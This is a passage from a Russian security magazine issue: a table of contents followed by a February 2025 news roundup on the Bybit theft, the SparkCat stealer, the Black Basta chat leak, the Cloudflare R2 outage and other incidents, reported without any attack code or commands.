
            № 311
CONTENTS


    MEGANews
  Самые важные события в мире инфосека за февраль

    Сетевые протоколы под микроскопом
  Реализуем атаки на DHCP, EIGRP, DTP и ARP в приложении на Python

      File Inclusion и Path Traversal
  Разбираем две базовые веб-уязвимости

    Виртуальный шифр
  Анализируем энкодер для VMware ESXi

    Опасные и интересные уязвимости февраля: Node
   js, Windows LDAP и Nvidia CUDA

   COM в ловушке
  Атакуем Windows через объекты Trapped COM

    Штурмуем крепость
  Обходим аутентификацию в FortiOS и FortiProxy

    Уроки форензики
  Расследуем кибератаку через соцсеть и раскрываем маскировку файла

     Relay again
  Изучаем актуальные техники атак NTLM Relay через SCCM

    Злостная эксплуатация
  Используем Angr, чтобы найти Buffer Overflow

    Темные игры
  Потрошим древнюю игру на DarkBASIC

    HTB Cicada
  Проводим базовые атаки на Active Directory

    HTB Trickster
  Пробираемся к руту через PrestaShop и Docker

    HTB MagicGardens
  Эксплуатируем переполнение буфера и повышаем привилегии в Linux

    HTB Yummy
  Атакуем веб-сервер и эксплуатируем слабую криптографию

    Призрачный тап
  Как фишеры штампуют ворованные карты через Apple и Google Pay

    Закрученный Python
  Используем instld, чтобы ставить пакеты на лету

    Пышки и Telegram
  Пишем клиент Telegram на PHP

    Страж безопасности
  Защищаем периметр при помощи Wazuh

    Злой провод
  HackCable собрал 50000 евро на Kickstarter

    Здоровое питание
  Как правильно подключить ИБП для домашней серверной

    Крутые запросы
  Как правильно просить Stable Diffusion нарисовать картинку

    Хакеры.RU. Глава 0х0E
  Следующий уровень

    Хакеры.RU. Глава 0х0F
  Реинициализация

    Хакеры.RU. Глава 0х10
  Перцептрон

    Хакеры.RU. Глава 0х11
  Руткит
                                       Мария «Mifrill» Нефёдова
                                                    nefedova@glc.ru


В этом месяце: у криптобиржи Bybit украли 1,5 миллиарда
долларов, в Steam обнаружили игру с малварью, в Россию
вернулся один из создателей и руководителей криптобиржи
BTC-e  Александр  Винник,  в App  Store  проник  первый
инфостилер, в сеть слили чаты хакерской группы Black Basta,
а также другие интересные события прошедшего февраля.





ВИННИК ВЕРНУЛСЯ
В РОССИЮ
В ответ на освобождение бывшего американского дипломата Марка Фогеля
из российской тюрьмы американские власти освободили одного из соз‐
дателей и руководителя криптобиржи BTC-e Александра Винника.
   Винника арестовали в Греции, куда он прилетел на отдых в 2017 году,
за участие в работе криптовалютной биржи BTC-e. Тогда власти США пот‐
ребовали его экстрадиции и заявили, что Винник использовал BTC-e в качес‐
тве подставной компании для операций по отмыванию денег, сознательно
получая средства от взломов и других форм киберпреступности, а также
помогая мошенникам конвертировать украденные средства в фиат.
   Официальное заявление Минюста США гласило, что Винник не только
руководил преступной  группой с 2011 года, но и отмыл через BTC-e
более 4 миллиардов долларов в криптовалюте, а также был причастен если
не к самому ограблению биржи Mt.Gox, то хотя бы к отмыванию похищенных
средств.
   Однако за арестом последовали долгие судебные разбирательства. Дело
в том, что, как только об аресте Винника стало известно, российские власти
тоже подали запрос об экстрадиции, утверждая, что Винник является подоз‐
реваемым по другому делу и с 2013 года обвиняется в мошенничестве
на сумму 9500 евро.
  В итоге споры из‑за экстрадиции растянулись надолго и дополнительно
усложнились тем, что власти Франции тоже подали собственный запрос о его
экстрадиции, заявляя, что намерены судить Винника по четырнадцати обви‐
нениям, связанным с отмыванием денег и взломами.
   Изначально адвокаты Винника даже выиграли дело, и в 2018 году суд
решил экстрадировать его в Россию, однако из‑за серьезного политического
давления со стороны официальных лиц как из России, так и из США вес‐
ной 2020 года греческие власти приняли решение передать Винника фран‐
цузским властям.
  В итоге судебный процесс во Франции не увенчался значительным успе‐
хом. Из четырнадцати выдвинутых обвинений было доказано лишь одно,
а остальные доказательства Европола успешно оспорили адвокаты обви‐
няемого. В итоге Александра Винника приговорили к пяти годам лишения
свободы и штрафу в размере 100 тысяч евро за отмывание денег для кибер‐
преступников.
   Так как американские власти не оставляли попыток добиться экстрадиции
Винника, в августе 2022 года его вновь вывезли в Грецию, а оттуда все же
отправили в США.
    Хотя за прошедшие годы в США не состоялось ни одного судебного слу‐
шания по делу Винника (все заседания были техническими), в мае 2024 года
он пошел на сделку со следствием и частично признал вину в отмывании
денег. По мнению адвокатов, ему грозило менее десяти лет лишения сво‐
боды, хотя изначально речь шла о почти двухстах годах тюрьмы в случае приз‐
нания виновным по всем пунктам обвинений. Вынесение приговора было
назначено на июнь 2025 года.
  В середине февраля стало известно, что президент США Дональд Трамп
согласовал освобождение Александра Винника в обмен на освобождение
осужденного в России бывшего дипломата Марка Фогеля. В 2022 году
Фогель, бывший преподаватель англо‑американской школы и ранее сот‐
рудник посольства США в Москве, был осужден на четырнадцать лет колонии
строгого режима за контрабанду наркотиков. В настоящее время Фогель уже
вернулся в США.
   Как вскоре сообщил адвокат Винника Фредерик Бело, 11 февраля сос‐
тоялось судебное слушание, в результате которого дело его подзащитного
в США было окончательно закрыто.
   13 февраля 2025 года самолет ВВС США с Александром Винником
на борту прибыл в Россию и приземлился в аэропорту Внуково.


      «Я хочу сказать спасибо всем. Президенту в первую очередь. Вла-
      димиру Владимировичу Путину. Лаврову, нашему главному дипломату.«
      Всем. Всем дипломатам. Всем  спецслужбам. Всем, всем людям,
       адвокатам, всем родным и близким. Всем, всем. И особенно моей
      семье. Что я хочу сказать? И можно еще Трампа поблагодарить. Ну,
      в общем, без него, наверное, как‑то трудно было бы», — сообщил
       Винник журналистам после прибытия в РФ.                »

2,3 МИЛЛИОНА ОПАСНЫХ ПРИЛОЖЕНИЙ

Компания Google отчиталась о том, что в 2024 году в Google Play было заблокировано более
2,3 миллиона приложений, которые могли представлять угрозу для пользователей. Также
были  забанены 158 тысяч  аккаунтов  разработчиков,  которые  пытались  опубликовать
в магазине приложений малварь. Для сравнения: в 2023 году Google заблокировала 2,28 мил-
лиона приложений.

Увеличение числа блокировок частично объясняется применением ИИ, который теперь помога‐
ет людям в проверке приложений и использовался для выявления нарушений в 92% случаев.





ЧЕЛОВЕК
«ПОЛОЖИЛ»
CLOUDFLARE
Попытка заблокировать фишинговый URL-адрес на платформе Cloudflare
R2 случайно вызвала масштабный сбой, из‑за которого многие сервисы
Cloudflare не работали около часа.
   Cloudflare R2  представляет  собой  объектное  хранилище,  похожее
на Amazon S3 и предназначенное для масштабируемого долговременного
бюджетного хранения данных. Сервис предлагает бесплатное извлечение
данных, совместимость с S3, репликацию данных и интеграцию с другими
решениями Cloudflare.
  Сбой произошел, когда один из сотрудников компании отреагировал
на сообщение о фишинговом URL-адресе на Cloudflare R2. Вместо того что‐
бы заблокировать конкретный эндпоинт, сотрудник по ошибке отключил весь
сервис R2 Gateway.

      «Во  время  рутинного  устранения  нарушения были  приняты меры
      в связи с жалобой, в результате которых по ошибке была отключена«
       служба R2  Gateway, а не  конкретный  эндпоинт/бакет,  связанный
      с жалобой», — пояснили  представители Cloudflare в своем  отчете
      об инциденте.                »
В итоге простой длился 59 минут, и, помимо самого объектного хранилища
R2, он затронул и другие сервисы, включая:
 • Stream — 100% отказов при загрузке и доставке потокового видео;
 • Images — 100% отказов при загрузке‑выгрузке изображений;
 • Cache Reserve — 100% отказов в работе, что привело к увеличению
   количества запросов к источникам;
 • Vectorize — 75% отказов для запросов и 100% отказов для операций
   вставки, удаления и upsert;
 • Log Delivery — задержки и потеря данных (до 13,6% потерь данных
   для связанных с R2 логов, а также до 4,5% потерь данных для не связанных
   с R2 delivery job);
 • Key Transparency Auditor — 100% отказов при операциях публикации и чте‐
   ния подписи.

Косвенно пострадали и другие сервисы, в работе которых наблюдались час‐
тичные сбои. Например, Durable Objects, в котором количество ошибок уве‐
личилось на 0,09% из‑за повторных подключений, Cache Purge, где количес‐
тво ошибок (HTTP 5xx) увеличилось на 1,8%, а задержка возросла в десять
раз, а также Workers & Pages, для которого сбои при развертывании сос‐
тавили 0,002%, затронув только проекты с привязкой к R2.





В Cloudflare отметили, что причиной инцидента стали как человеческий фак‐
тор, так и отсутствие таких защитных мер, как валидация потенциально опас‐
ных действий.
   Компания заявила, что уже приняла соответствующие меры. В частности,
возможность отключения систем была удалена из интерфейса, которым поль‐
зуются специалисты по устранению злоупотреблений. Также в Admin API
появились ограничения для предотвращения отключения сервисов для внут‐
ренних учетных записей.


ДОХОДЫ ВЫМОГАТЕЛЕЙ ПАДАЮТ

Блокчейн‑аналитики из Chainalysis подсчитали, что объем выкупов, полученных вымогательски‐
ми хакгруппами в 2024 году, снизился на 35% по сравнению с предыдущим годом и составил
813,55 миллиона долларов. Для сравнения: в 2023 году этот показатель равнялся 1,25 мил-
лиарда долларов.





В прошлом году только около 30% жертв, участвовавших в переговорах с вымогателями,
в итоге согласились заплатить злоумышленникам хоть что‑то.


Также отмечается рост количества утечек украденных у компаний данных. Это свидетельствует
о том, что  злоумышленникам  стало  труднее получать выкупы и они  увеличивают свою
активность.





Самой крупной «удачей» хакеров в прошлом году стал взлом неназванной компании из списка
Fortune 50, которая в итоге выплатила группировке Dark Angels рекордную сумму — 75 мил-
лионов долларов.





МАЛВАРЬ В STEAM
Компания Valve удалила из Steam игру PirateFi и уведомила пользователей,
что та могла содержать вредоносное ПО. В своем сообщении Valve отметила,
что пользователям, загрузившим игру, стоит «подумать о полном перефор‐
матировании операционной системы».
   Согласно описанию PirateFi, этот продукт Seaworth Interactive рекламиро‐
вался как бесплатная «захватывающая игра на выживание в ярком низкополи‐
гональном мире, где вы сможете играть в одиночку или с другими игроками».
   Неизвестно, сколько именно человек успели загрузить игру, но в Steam
она успела получить хорошие отзывы (архивная версия страницы в Steam).
По статистике SteamDB, у игры насчитывалось 165 подписчиков, а пиковое
количество игроков составляло всего пять человек. Однако, по оценкам Video
Game Insights, игра была продана в количестве 1530 экземпляров, а Gamalytic
считает, что ее скачали 859 человек.
   Игра была удалена из Steam в начале месяца, после чего загрузившие ее
пользователи начали получать предупреждения от Valve.





В этом уведомлении Valve сообщала, что удалила потенциально опасные
сборки PirateFi из Steam.
   Пользователям рекомендовалось «запустить полную проверку системы
с помощью антивирусного продукта, которому вы доверяете или который
регулярно  используете, и  проверить  систему на наличие  неизвестных
или недавно установленных программ». Также в Valve добавили, что только
полное обнуление системы «гарантирует, что на вашем компьютере не оста‐
нется вредоносных программ».
  При этом в компании не уточнили, какое именно вредоносное ПО было
обнаружено в PirateFi.
   Как сообщил один из читателей издания PCMag, игру также пытались рас‐
пространять через Telegram. По его словам, в Telegram-канале, где было мно‐
го пользователей из США, появилось предложение о работе: вакансия
модератора внутриигрового чата PirateFi с оплатой 17 долларов в час.
   Читатель решил, что это предложение выглядит слишком подозрительно,
провел небольшое расследование и обнаружил, что аккаунтом управляет бот.

      «Я заметил, что скорость его ответов была очень стабильной, почти
       всегда 21 секунда. Я пообщался с ИИ, который пытался вынудить«
     людей загрузить игру (PirateFi) на свои устройства, чтобы заразить их
       компьютеры», —  рассказал  читатель  и  показал  скриншот  этой
       переписки.                »





БРЮС ШНАЙЕР О КОНФИДЕНЦИАЛЬНОСТИ В 2025 ГОДУ





Известный эксперт по информационной безопасности и криптограф Брюс Шнайер (Bruce
Schneier) дал интервью изданию The Register.
   Еще десять лет назад в своей книге «Данные и Голиаф» (Data and Goliath) Шнайер расска‐
зывал, как правительства и технологические компании используют персональные данные. Тог‐
да он предсказывал необратимую потерю конфиденциальности и архивирование буквально
всего. Вот как Шнайер оценивает происходящее теперь.
  О конфиденциальности:

         «В целом ничего не изменилось с 2015 года. Правительство, АНБ и их кол‐→       леги по всему миру по‑прежнему занимаются массовой слежкой в меру своих
        возможностей. Также за нами еще более активно шпионят корпорации и ком‐
       пании, начиная от крупных технологических монополий и заканчивая невиди‐
     мыми брокерами данных.
          Кроме того, информационная среда ухудшилась. Большая часть наших дан‐
      ных находится в облаке, где компании имеют к ним легкий доступ. Вокруг нас
       все больше устройств интернета вещей, которые держат нас под постоянным
       наблюдением. И каждый из нас носит с собой невероятно сложное устройство
        слежения, куда бы мы ни пошли: наши смартфоны. Куда ни повернись, кон‐
       фиденциальность исчезает».


Пара советов:

         «Я мог бы посоветовать вам не носить с собой смартфон, не иметь адреса→        электронной почты и не пользоваться кредитными картами. Но такой совет
      был бы глупым в 2015 году, а сегодня он выглядит еще глупее.
           Лично я очень стараюсь не пользоваться облачными сервисами, но это ста‐
        новится все труднее, потому что их используют все остальные. Я стараюсь
       использовать Signal и WhatsApp для переписки, но это не всегда возможно.
     И хотя я не пользуюсь Gmail, у Google есть больше половины моих писем,
       потому что больше половины моих собеседников ею пользуются».


Про Apple:

          «Apple — исключение. Она не зарабатывает на шпионаже за своими поль‐→        зователями. Она зарабатывает на продаже электроники по завышенным ценам.
       Так что да, возможно, это единственный технологический монополист, который
      может обеспечить вам конфиденциальность. Однако не  стоит  считать, что
       это что‑то большее, нежели чем простая корыстная позиция бизнеса».


О будущем:

         «Я не могу представить, что через пятьдесят лет у нас будет такой же уро‐→       вень массовой слежки (как корпоративной, так и правительственной). Думаю,
     мы будем рассматривать подобные бизнес‑практики так же, как сегодня мы
        рассматриваем потогонные фабрики: как свидетельство нашего не слишком
        этичного прошлого.
        Но это произойдет очень нескоро. До тех пор пока корпорации и правитель‐
       ства упиваются нашими данными, у нас нет реальных стимулов для перемен.
      А ИИ‑технологии только усугубят проблему».





УТЕЧКА BLACK BASTA
В сети опубликован архив логов из внутреннего чата Matrix, где якобы обща‐
лись операторы вымогателя Black Basta. ИБ‑исследователи полагают, что
из‑за масштабного внутреннего конфликта группировка фактически прек‐
ратила свое существование в начале 2025 года.
   Некто под ником ExploitWhispers сначала выложил логи чатов в файлооб‐
менник MEGA, откуда их уже удалили, а затем загрузил их в отдельный
Telegram-канал. При этом неизвестно, кем именно является ExploitWhispers:
ИБ‑исследователем,  конкурентом  или  недовольным  членом  хакгруппы.
Заметим, что русский язык для него явно неродной.


                                     Продолжение статьи →
← Начало статьи





   Утечка содержит сообщения, которыми участники группировки обменивались
   в период с 18 сентября 2023 года по 28 сентября 2024 года.
     Как сообщили  специалисты  швейцарской  компании  Prodaft,  одними
  из первых заметившие происходящее, этот слив может быть прямым следс‐
   твием того, что группировка предположительно атаковала российские банки.
   Так, некоторым участникам команды это якобы не понравилось, поскольку
  они опасались, что последует ответ со стороны российских властей.

       «Мы заметили, что группа Black Basta (Vengeful Mantis) практически
        не проявляла активности с начала года из‑за внутренних конфликтов. «
         Некоторые из ее операторов обманывали жертв, собирая выкупы и не
          предоставляя в ответ работающие дешифраторы, — пишут эксперты
           Prodaft. — 11 февраля 2025 года произошла крупная утечка, в резуль-
         тате которой были  раскрыты  логи  внутренних  чатов  Black  Basta
         в Matrix. Сливший их человек утверждает, что опубликовал эти дан-
         ные, потому что группировка нацелилась на российские банки. Эта
           утечка очень похожа на предыдущие утечки Conti».                 »
   Анализ логов, которые уже доступны на GitHub, показал, что они содержат
  широкий спектр информации, включая фишинговые шаблоны и электронные
   адреса для их отправки, криптовалютные адреса, учетные данные жертв и так
   далее.
      Также в логах были найдены 367 уникальных ссылок ZoomInfo, что может
   свидетельствовать о вероятном количестве компаний‑жертв. Вымогатель‐
  ские группировки нередко используют ZoomInfo для обмена информацией
  о жертвах и во время ведения переговоров.
    По словам аналитика компании Prodaft, известного под ником 3xp0rt,
   ExploitWhispers поделился информацией о некоторых ключевых членах Black
   Basta, включая Lapa (один из администраторов), Cortes (связан с группой
   Qakbot), YY (главный администратор Black Basta) и Trump (он же GG и AA),
  который якобы возглавляет группировку.
      Напомним, что Black Basta активна с апреля 2022 года и работает по схе‐
  ме Ransomware-as-a-Service (RaaS, «вымогатель как услуга»). За это время
   операторы малвари атаковали множество известных организаций, включая
   немецкого оборонного подрядчика Rheinmetall, европейское подразделение
   Hyundai, компанию ABB, Knauf , Публичную библиотеку Торонто, Американ‐
  скую ассоциацию стоматологов, Sobeys и Yellow Pages Canada.
      ИБ‑специалисты полагают, что Black Basta является ребрендингом извес‐
  тной хакгруппы Conti: на это указывает сходство используемых техник хакеров
  и стиля ведения переговоров.


 GOOGLE ДОЛЖНА РОССИЙСКИМ ТЕЛЕКАНАЛАМ
  2,86 ДУОДЕЦИЛЛИОНА РУБЛЕЙ

   Долг компании Google перед российскими телеканалами достиг почти трех дуодециллионов
    рублей, так как ранее российские суды обязали Google восстановить аккаунты российских
   медиа на YouTube, но этого не произошло. Дуодециллион — это единица с 39 нулями.

   За каждый день неисполнения решения суда начисляется штраф в размере 100 тысяч рублей,
   и сумма удваивается каждую неделю.


   На очередном заседании юрист заявил, что на оплату такого штрафа не хватит «всех активов
   на планете Земля и в галактике Млечного пути». По его словам, сумма не отвечает принципу
   соразмерности и «порождает процессуальных гомункулов».





 ПЕРВЫЙ СТИЛЕР
 В APP STORE
  В конце 2024 года исследователи «Лаборатории Касперского» обнаружили
   в Apple App Store, Google Play и на неофициальных площадках ранее неизвес‐
  тный троян SparkCat, предназначенный для кражи данных. Малварь рас‐
   пространяется в составе зараженных мессенджеров, ИИ‑ассистента, при‐
   ложений для доставки еды и доступа к криптобирже.
      Приложения, в которые был  встроен  вредоносный модуль,  скачали
  из Google Play более 242 тысяч раз. Кроме того, это первый известный случай
   проникновения стилера в App Store.
      Пока атаки SparkCat были нацелены на пользователей Android- и iOS-
   устройств в ОАЭ, странах Европы и Азии. Однако специалисты не исключают,
   что с подобной угрозой могут столкнуться люди и в других регионах, в том
   числе в России.
    На зараженном устройстве SparkCat запрашивает доступ к просмотру
  фото. При этом малварь анализирует текст на найденных в галерее изоб‐
   ражениях, используя модуль оптического распознавания символов (OCR)
  на основе библиотеки Google ML Kit.
      Если стилер находит на картинке ключевые слова, он отправляет изоб‐
  ражение своим операторам. Цель атакующих — найти фразы для восстанов‐
  ления доступа к криптокошелькам, чтобы похитить цифровые активы жертв.
   Кроме того, малварь может похищать и другие данные, включая содержание
  сообщений или пароли, если они присутствуют на скриншотах.





         Поиск ключевых слов в результатах обработки изображений OCR-моделью

   Согласно временным меткам в файлах малвари и датам создания файлов
   конфигураций в  репозиториях на  GitLab, SparkCat был  активен с мар‐
   та 2024 года.
      Исследователи задались вопросом: какие именно картинки интересуют
   атакующих? Для этого эксперты запросили список ключевых слов для OCR-
   поиска с командных серверов. В каждом случае в ответ пришли слова
  на китайском, японском, корейском, английском, чешском, французском,
   итальянском, польском и португальском языках. Все они указывали на финан‐
  совую мотивацию злоумышленников: их интересовали фразы для восстанов‐
  ления доступа к криптокошелькам (мнемоники).
    Во время анализа Android-приложений было обнаружено, что процессоры
  слов содержат комментарии на китайском языке. В ответ на некорректные
   запросы управляющий сервер тоже возвращает описание ошибок на китай‐
   ском. Это, а также имя домашней папки разработчика фреймворка, получен‐
  ное в ходе анализа iOS-версии SparkCat, дало исследователям основания
   полагать, что разработчик вредоносного модуля свободно владеет китайским
   языком. При этом имеющихся данных недостаточно, чтобы с уверенностью
   приписать эту кампанию какой‑либо конкретной хакгруппе.
      Специалисты «Лаборатории  Касперского» уведомили Google и Apple
  о наличии вредоносных приложений, и по состоянию на 7 февраля 2025 года
  все вредоносные приложения были удалены. Однако SparkCat продолжает
   распространяться через неофициальные площадки.

        «В App Store регулярно проникали различные скам- и мошеннические
          приложения, однако это первый известный случай интеграции вре- «
         доносной программы, крадущей данные пользователя, в приложения
         в официальном магазине. У нас нет точных сведений о том, оказались
        они заражены в результате атаки на цепочку поставок или другим
          способом. Некоторые  сервисы, например  доставки еды,  выглядят
          вполне легитимными, тогда как другие, очевидно, являются приман-
          кой. Например, мы видели несколько схожих „мессенджеров“ с заяв-
         ленными функциями ИИ от одного и того же разработчика», — ком-
          ментирует  Сергей  Пузан,  эксперт  «Лаборатории   Касперского»
        по кибербезопасности.                 »

  768 CVE ПОД АТАКАМИ
    Аналитики VulnCheck подсчитали, что в 2024 году было зарегистрировано 768 CVE, которые
   использовались злоумышленниками в реальных атаках. Это на 20% больше, чем в 2023 году,
    когда хакеры эксплуатировали 639 уязвимостей.

  23,6% всех известных эксплуатируемых уязвимостей были задействованы либо в день, когда
   данные о них были публично раскрыты, либо еще до этого момента.

  В 2024 году лишь 1% публично раскрытых CVE использовался в реальных атаках. Но ожидает‐
    ся, что их число будет расти, поскольку эксплуатация часто обнаруживается спустя долгое вре‐
   мя после раскрытия деталей об уязвимости.





   Специалисты подчеркивают, что попытки эксплуатации могут происходить в любой момент
   на протяжении существования уязвимости, невзирая на шумиху, которая окружает 0-day-баги.





 ВЗЛОМ BYBIT
   Злоумышленники похитили криптовалюту на сумму более 1,46 миллиарда
   долларов с одного из холодных кошельков криптовалютной биржи Bybit.
  Это крупнейший криптовалютный взлом в истории, более чем вдвое пре‐
  вышающий предыдущий рекорд.
     Компания объявила о вознаграждении в размере 10% от украденных
  средств (порядка 140 миллионов долларов) за любую информацию, которая
  поможет вернуть похищенное. ИБ‑эксперты уже связали эту атаку с северо‐
   корейской хакгруппой Lazarus.

         «21 февраля 2025 года примерно в 12:30 UTC компания Bybit обна-
          ружила несанкционированную активность в одном из наших холодных «
         кошельков Ethereum (ETH) во время обычного процесса перевода.
        Перевод был частью запланированного перемещения ETH из нашего
          холодного multisig-кошелька ETH в горячий кошелек, — рассказали
           представители Bybit в отчете об атаке. — К сожалению, транзакцией
          манипулировали при помощи сложной атаки, которая изменила логику
          смарт‑контракта и интерфейс  подписи,  что  позволило  злоумыш-
          леннику получить контроль над холодным кошельком ETH. В резуль-
         тате более 400 тысяч ETH и stETH на сумму свыше 1,5 миллиарда
         долларов были переведены на неизвестный адрес».                 »
   Эксперты компании Check Point полагают, что злоумышленники выявили лиц,
   ответственных за утверждение multisig-транзакций, а затем взломали их
   устройства с помощью  некоего  вредоносного ПО, фишинга или  атаки
  на цепочку поставок.
      Невзирая на кражу 1,5 миллиарда долларов и массовую волну запросов
  на вывод средств, в Bybit заверили, что все остальные холодные кошельки
   надежно защищены, средства клиентов находятся в безопасности и инцидент
  не повлияет на работу биржи. Кроме того, генеральный директор Bybit Бен
  Чжоу (Ben Zhou) заявил, что Bybit полностью платежеспособна и сможет пок‐
  рыть все убытки.
      Вскоре после атаки известный блокчейн‑аналитик ZachXBT, первым обна‐
  руживший  инцидент,  сообщил,  что за  произошедшим,  вероятно,  стоит
   северокорейская хакгруппа Lazarus. Дело в том, что злоумышленники отпра‐
  вили украденные у Bybit средства на Ethereum-адрес, который ранее уже
   фигурировал в атаках на Phemex, BingX и Poloniex.
      Также исследователь отметил, что Lazarus отмывает украденные ETH
  с помощью миксера eXch и переводит средства в Bitcoin через Chainflip.
     Выводы ZachXBT подтвердили специалисты компаний TRM Labs и Elliptic,
  которые также пишут, что за взломом Bybit стоят северокорейские хакеры.
  При этом в Elliptic отметили, что украденные средства уже прошли через
   большое количество кошельков и таким образом хакеры стремятся скрыть
   фактическое происхождение активов, замедлив попытки их отслеживания.

        «Один конкретный обменник, eXch, похоже, сознательно отмыл укра-
         денные средства на сумму в десятки миллионов долларов, несмотря «
         на призывы Bybit прекратить, — говорят в  Elliptic. — Похищенные
          средства в основном  конвертируются в биткоины. Если злоумыш-
          ленники снова применят прежние схемы отмывания средств, можно
          ожидать использования биткоин‑миксеров для сокрытия следов».                 »
   Представители eXch отрицают обвинения в умышленном отмывании украден‐
  ных у Bybit средств, заявляя, что «eXch не отмывает деньги для Lazarus
  и Северной Кореи». Якобы на eXch поступила лишь малая часть украденных
   средств, это был единичный случай, и комиссия от этой операции будет
   передана на благотворительность.
     Тем временем представители Bybit объявили о запуске программы воз‐
   награждений, которая должна помочь вернуть украденные средства и вычис‐
   лить хакеров, стоявших за этой атакой. Bybit пообещала выплатить 10%
   от возвращенных средств (до 140 миллионов долларов США) ИБ‑экспертам,
  которые «сыграют активную роль в возвращении украденных криптовалют».
      Напомним, что до взлома Bybit крупнейшим криптовалютным ограблением
   в истории считалась атака на Axie Infinity и сайдчейн Ronin, произошедшая
   в марте 2022 года. Тогда хакеры похитили более 600 миллионов долларов
  с помощью всего двух транзакций.


 РОСКОМНАДЗОР О ДИАЛОГЕ С GOOGLE И X





  В конце февраля заместитель главы Роскомнадзора (РКН) Вадим Субботин сообщил СМИ, что
   РКН не ведет диалог с компанией Google или социальной сетью X (бывший Twitter).

              «Никакого диалога с Google (и X) на сегодняшний день у нас нет. Они не нуж‐ →        ны в нашей стране. Если возникнет в них необходимость, будем разбирать‐
            ся», — заявил Субботин, добавив, что Steam выполняет все требования россий‐
            ского  законодательства по  удалению  запрещенной  информации,  поэтому
           к Valve «вопросов нет».





 JAVASCRIPT В BRAVE
   Браузер Brave получил новую функцию — пользовательские скриптлеты
   (custom  scriptlets), которые  позволяют  внедрять  собственный  JavaScript
  на  страницы  сайтов,  обеспечивая  глубокую  кастомизацию и  контроль
  над работой браузера.
      Новая функция появилась в Brave версии 1.75 для десктопов и очень
  похожа   на   популярные   браузерные   расширения   Tampermonkey
  и Greasemonkey, которые тоже позволяют пользователям создавать скрипты,
  изменяющие функциональность определенных сайтов.
    По  словам  разработчиков  Brave,  изначально  функция  создавалась
  для отладки работы блокировщика рекламы, но оказалась слишком ценной,
   чтобы не поделиться ею с сообществом.
      Функция может использоваться для модификации веб‑страниц для обес‐
  печения  конфиденциальности, безопасности и  удобства использования.
  К примеру, для связанных с конфиденциальностью изменений люди пишут
   скрипты, блокирующие трекеры на основе JavaScript, рандомизирующие
   фингерпринтинговые API и подменяющие скрипты Google Analytics фиктивны‐
  ми версиями.
      Также скрипты могут использоваться для скрытия боковых панелей, всплы‐
  вающих окон, рекламы или раздражающих виджетов, принудительного вклю‐
  чения темного режима на сайтах, которые его не поддерживают, принуди‐
   тельной бесконечной прокрутки, настройки цветов текста и размера шрифта
  и так далее. Например, в своем анонсе разработчики Brave демонстрируют
   скрипт, удаляющий боковые панели с определенного сайта.





  В целях повышения производительности скриптлеты могут блокировать авто‐
   воспроизведение видео, выполнять «ленивую» загрузку изображений, авто‐
   матически заполнять формы заранее определенными данными, обходить
   ограничения на нажатие правой кнопки мыши.
       Хотя команда Brave считает, что скриптлеты — это мощный инструмент
   в руках опытных пользователей, кастомный JavaScript может вызвать проб‐
  лемы в работе сайтов. По этой причине разработчики поместили новую фун‐
  кцию под флаг режима для разработчиков (Developer), в разделе Shields →
   Content Filtering. Таким образом, новую функцию можно найти по адресу
   brave://settings/shields/filters, включив режим разработчика.
      Создатели Brave напоминают, что важно использовать только свой код
  или код, полученный от доверенных лиц, избегая всего непроверенного
   в целях безопасности.


  PIN-КОД 1234 ИСПОЛЬЗУЕТ КАЖДЫЙ ДЕСЯТЫЙ ЧЕЛОВЕК

   Журналисты ABS изучили обезличенные данные из базы агрегатора утечек Have I Been Pwned
     (29 миллионов PIN-кодов) и пришли к выводу, что самым распространенным PIN-кодом явля‐
   ется 1234, который использует 1 человек из 10.

   Вторым по популярности стал 0000, а за ним следуют 1111, 1212 и 4444.

   Кроме того, часто встречаются 4321 (1234 наоборот) и 2580 (прямая линия на клавиатуре
   телефона).

    Также пользователи часто используют в качестве PIN год своего рождения, поэтому 1986
   и 2004 входят в двадцатку самых используемых. По этой же причине популярны комбинации,
   которые начинаются с 19 или 20.





                                        Продолжение статьи →
← Начало статьи





 МТС VS
 РОСКОМНАДЗОР
   Компания МТС считает, что необходимость предоставлять Роскомнадзору
   (РКН) дополнительные данные, позволяющие идентифицировать оборудо‐
   вание, через которое пользователи входят в интернет, нарушит тайну связи
  и потребует больших затрат на модернизацию сети. В РКН настаивают, что
   предлагаемые меры, наоборот, обезопасят пользователей.
   О возможных рисках говорится в ответе МТС на проект приказа Рос‐
   комнадзора о порядке, сроках, составе и формате предоставления операто‐
  рами подобных данных.
      Напомним, что этот проект был опубликован в декабре 2024 года. Тогда
  СМИ и эксперты сочли, что таким образом РКН будет собирать информацию
  о пользователях, которые заходят на заблокированные в России ресурсы.
      Документ разработан в рамках реализации федерального закона № 216-
  ФЗ и вносит изменения в закон «Об информации, информационных тех‐
   нологиях и защите информации» и в отдельные законодательные акты.
      Согласно тексту документа, поправки касаются распространения про‐
   тивоправной  информации,  оскорбляющей   человеческое   достоинство
  и общественную нравственность, выражающей явное неуважение к общес‐
   тву, содержащей изображение действий с признаками противоправных, в том
   числе  насильственных, и  распространяемой из  хулиганских,  корыстных
  или иных низменных побуждений.
     Для выявления оборудования было предложено использовать технические
   средства противодействия угрозам (ТСПУ). Как указано в пояснительной
   записке, эти средства проводят анализ трафика, после чего по сетевому
   адресу можно определить пользователя, получающего доступ к противоп‐
  равным  сайтам.  Операторы  должны  будут  предоставить  информацию
   в течение трех месяцев со дня вступления приказа в силу, а затем — не поз‐
  днее чем через пятнадцать рабочих дней с даты начала оказания услуг поль‐
   зователю.
    В частности, операторы будут обязаны предоставлять РКН:
   • данные об IP-адресах, с которых пользователи подключаются к интернету;
   • информацию о регионе, муниципальном районе или внутригородской тер‐
     ритории, где используются эти IP-адреса;
   • уникальные номера ТСПУ, через которые пропускается трафик от данных
      IP-адресов;
   • если оператор одновременно выделяет пользователю IP-адреса по про‐
      токолам IPv4 и IPv6, то также обязан предоставить информацию об иден‐
      тификаторе пользовательского оборудования.

  Об изменениях в этой информации оператор должен будет сообщать в РКН
   в течение одного дня через электронную почту или личный кабинет на сайте
   ведомства.
    В пояснительной записке к документу говорится, что новое регулирование
   коснется 1981 оператора связи, из которых 493 подключены к ТСПУ. Затраты
  на выполнение этих требований в Роскомнадзоре оценивают в 389 мил‐
  лионов рублей в год, или 2,3 миллиарда рублей за шесть лет.
     Изменения нужны, чтобы эффективно выявлять интернет‑трафик к зап‐
  рещенным сайтам и ограничивать его с помощью ТСПУ, а также защитить
   граждан от возможного нарушения их прав (мошенничества, нарушения тре‐
   бований по обработке персональных данных). Также ранее в РКН объясняли,
   что изменения нужны «в целях противодействия компьютерным атакам, в том
   числе DDoS-атакам».
    В своем отзыве на приказ представители МТС пишут, что сведения,
  которые оператор получает об абоненте не из договора (в том числе адрес
